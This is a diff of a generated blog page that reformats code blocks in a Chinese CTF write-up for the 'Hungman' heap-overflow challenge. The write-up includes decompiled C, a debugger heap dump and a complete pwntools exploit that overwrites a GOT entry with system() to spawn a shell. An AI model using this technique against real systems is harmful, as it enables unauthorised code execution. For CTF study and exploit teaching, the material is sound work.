@@ -81,6 +81,11 @@
         <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
 
         
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/github-v2.min.css?AfzKxt++K+/lhZBlSjnxwg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+            
+        
 
     
 
@@ -491,15 +496,35 @@
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
         <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个程序一开始要输入name，name存储在堆中：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//相关数据体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="keyword">int</span> name_len;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="C">//相关数据体
+struct 
+{
+    int score;
+    int name_len;
+    char *name;
+}</code></pre>
 <p>然后让你玩游戏，游戏是是让你猜随机生成和你name等长的随机字符串，有三次猜错机会，全部猜出来会获得一次change name的机会。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="string">'y'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        s = <span class="built_in">malloc</span>(<span class="number">0xF8</span>uLL);</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xF8</span>uLL);</span><br><span class="line">        v8 = read(<span class="number">0</span>, s, <span class="number">0xF8</span>uLL);</span><br><span class="line">        *(_DWORD *)(a1 + <span class="number">4</span>) = v8;</span><br><span class="line">        v14 = <span class="built_in">strchr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">          *v14 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(*(<span class="keyword">void</span> **)(a1 + <span class="number">8</span>), s, v8);</span><br><span class="line">        <span class="built_in">free</span>(s);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="C">if ( v3 == &#39;y&#39; )
+      {
+        s = malloc(0xF8uLL);
+        memset(s, 0, 0xF8uLL);
+        v8 = read(0, s, 0xF8uLL);
+        *(_DWORD *)(a1 + 4) = v8;
+        v14 = strchr((const char *)s, 10);
+        if ( v14 )
+          *v14 = 0;
+        memcpy(*(void **)(a1 + 8), s, v8);
+        free(s);
+      }</code></pre>
 <p>我们可以看到新输入的name是写到存储着原来name堆块中的，于是这里便可以造成堆溢出，修改结构体中的指向name指针：</p>
-<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000031</span></span><br><span class="line"><span class="number">0x603010</span>:	<span class="number">0</span>x6<span class="number">161616161616161</span>	<span class="number">0</span>x6<span class="number">161616161616161</span></span><br><span class="line"><span class="number">0x603020</span>:	<span class="number">0</span>x6<span class="number">161616161616161</span>	<span class="number">0</span>x0000<span class="number">000000006161</span></span><br><span class="line"><span class="number">0x603030</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000091</span></span><br><span class="line"><span class="number">0x603040</span>:	<span class="number">0</span>x00000<span class="number">01b00000000</span>	<span class="number">0</span>x00000<span class="number">00000603010</span>   &lt;---cover here</span><br><span class="line"><span class="number">0x603050</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br></pre></td></tr></table></figure>
-
-<p>于是我们可以：</p>
+<pre><code>pwndbg&gt; x/40gx 0x603000
+0x603000:    0x0000000000000000    0x0000000000000031
+0x603010:    0x6161616161616161    0x6161616161616161
+0x603020:    0x6161616161616161    0x0000000000006161
+0x603030:    0x0000000000000000    0x0000000000000091
+0x603040:    0x0000001b00000000    0x0000000000603010   &lt;---cover here
+0x603050:    0x0000000000000000    0x0000000000000000
+</code></pre><p>于是我们可以：</p>
 <ul>
 <li>第一次change name，修改指针为strchr@got，同时leak libc</li>
 <li>第二次change name，覆写stchr为system</li>
@@ -510,8 +535,85 @@
 <p>如果我们一开始较长的name，那么buf中所有字母基本就都会出现，依次把所有字母输一圈就可以赢得游戏获得改名字的机会</p>
 </blockquote>
 <p>当然还有其他方法来get shell，但殊途同归：<a href="https://bamboofox.github.io/write-ups/2016/09/19/CSAW-CTF-16-Hungman-300.html" target="_blank" rel="noopener">参考</a></p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./hungman'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hungman'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def pwn():</span></span><br><span class="line"><span class="string">    #gdb.attach(p,'p (char *)0x6030f0')</span></span><br><span class="line"><span class="string">    guess = raw_input()</span></span><br><span class="line"><span class="string">    a = ""</span></span><br><span class="line"><span class="string">    for i in guess:</span></span><br><span class="line"><span class="string">        if i not in a:</span></span><br><span class="line"><span class="string">	    a += i        </span></span><br><span class="line"><span class="string">    p.send(a)</span></span><br><span class="line"><span class="string">    p.recvuntil('change name?')</span></span><br><span class="line"><span class="string">    p.sendline('y')</span></span><br><span class="line"><span class="string">    time.sleep(0.1)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#play函数直接copy上述链接里的</span></span><br><span class="line">letters=<span class="string">'abcdefghijklmnopqrstuvwxyzz'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">play</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">'-- play --'</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> letters:</span><br><span class="line">		recv=p.recvline()</span><br><span class="line">		<span class="keyword">print</span> recv</span><br><span class="line">		<span class="keyword">if</span> recv.startswith(<span class="string">'High score! change name?'</span>):</span><br><span class="line">			<span class="keyword">print</span> recv</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[*] win!'</span></span><br><span class="line">			p.sendline(<span class="string">'y'</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		<span class="keyword">if</span> recv.startswith(<span class="string">'Default Highscore  score: 64'</span>):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[-] try again...'</span></span><br><span class="line">			p.recvuntil(<span class="string">'Continue? '</span>)</span><br><span class="line">			p.sendline(<span class="string">'y'</span>)</span><br><span class="line">			<span class="keyword">return</span> play()</span><br><span class="line">		p.sendline(c)	 </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">p.recvline()    </span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">26</span>)</span><br><span class="line">payload = <span class="string">'b'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p32(<span class="number">0x20</span>)+p32(<span class="number">28</span>)+p64(elf.got[<span class="string">'strchr'</span>])</span><br><span class="line">gdb.attach(p,<span class="string">'p (char *)0x6030d0'</span>)</span><br><span class="line"><span class="comment">#pwn()</span></span><br><span class="line">p.recvline()</span><br><span class="line">play()</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'player: '</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'strchr'</span>]<span class="number">-0x30</span></span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">malloc = libc_base + libc.sym['malloc']</span></span><br><span class="line"><span class="string">payload = "sh\x00".ljust(8)</span></span><br><span class="line"><span class="string">payload += 'A'*8</span></span><br><span class="line"><span class="string">payload += p64(system)</span></span><br><span class="line"><span class="string">payload += p64(malloc)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload = p64(system)</span><br><span class="line">p.recvuntil(<span class="string">'Continue? '</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'p (char *)0x6030d0')</span></span><br><span class="line">play()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Continue? '</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'p (char *)0x6030d0')</span></span><br><span class="line">play()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
 
+#context.log_level = &#39;debug&#39;
+
+p = process(&#39;./hungman&#39;)
+elf = ELF(&#39;./hungman&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+&#39;&#39;&#39;
+def pwn():
+    #gdb.attach(p,&#39;p (char *)0x6030f0&#39;)
+    guess = raw_input()
+    a = &quot;&quot;
+    for i in guess:
+        if i not in a:
+        a += i        
+    p.send(a)
+    p.recvuntil(&#39;change name?&#39;)
+    p.sendline(&#39;y&#39;)
+    time.sleep(0.1)
+&#39;&#39;&#39;
+
+#play函数直接copy上述链接里的
+letters=&#39;abcdefghijklmnopqrstuvwxyzz&#39;
+def play():
+    print &#39;-- play --&#39;
+    for c in letters:
+        recv=p.recvline()
+        print recv
+        if recv.startswith(&#39;High score! change name?&#39;):
+            print recv
+            print &#39;[*] win!&#39;
+            p.sendline(&#39;y&#39;)
+            return
+        if recv.startswith(&#39;Default Highscore  score: 64&#39;):
+            print &#39;[-] try again...&#39;
+            p.recvuntil(&#39;Continue? &#39;)
+            p.sendline(&#39;y&#39;)
+            return play()
+        p.sendline(c)     
+
+
+p.recvline()    
+p.sendline(&#39;a&#39;*26)
+payload = &#39;b&#39;*0x20+p64(0)+p64(0x91)+p32(0x20)+p32(28)+p64(elf.got[&#39;strchr&#39;])
+gdb.attach(p,&#39;p (char *)0x6030d0&#39;)
+#pwn()
+p.recvline()
+play()
+time.sleep(0.1)
+p.sendline(payload)
+
+p.recvuntil(&#39;player: &#39;)
+libc_base = u64(p.recv(6)+&#39;\x00\x00&#39;)-libc.sym[&#39;strchr&#39;]-0x30
+success(&#39;libc_base: &#39;+hex(libc_base))
+
+system = libc_base + libc.sym[&#39;system&#39;]
+&#39;&#39;&#39;
+malloc = libc_base + libc.sym[&#39;malloc&#39;]
+payload = &quot;sh\x00&quot;.ljust(8)
+payload += &#39;A&#39;*8
+payload += p64(system)
+payload += p64(malloc)
+&#39;&#39;&#39;
+payload = p64(system)
+p.recvuntil(&#39;Continue? &#39;)
+p.sendline(&#39;y&#39;)
+#gdb.attach(p,&#39;p (char *)0x6030d0&#39;)
+play()
+p.send(payload)
+
+p.recvuntil(&#39;Continue? &#39;)
+p.sendline(&#39;y&#39;)
+
+payload = &#39;/bin/sh&#39;
+#gdb.attach(p,&#39;p (char *)0x6030d0&#39;)
+play()
+p.sendline(payload)
+p.interactive()</code></pre>
 
         
     
@@ -866,6 +968,12 @@ It will not impact the appearance and can give developers a lot of support :)
 
 <!-- Import prettify js  -->
 
+    
+        
+            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
+        
+    
+
 
 
 <!-- Window Load -->
@@ -876,6 +984,13 @@ It will not impact the appearance and can give developers a lot of support :)
         $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
     });
 
+    
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
+        
     
     
 </script>
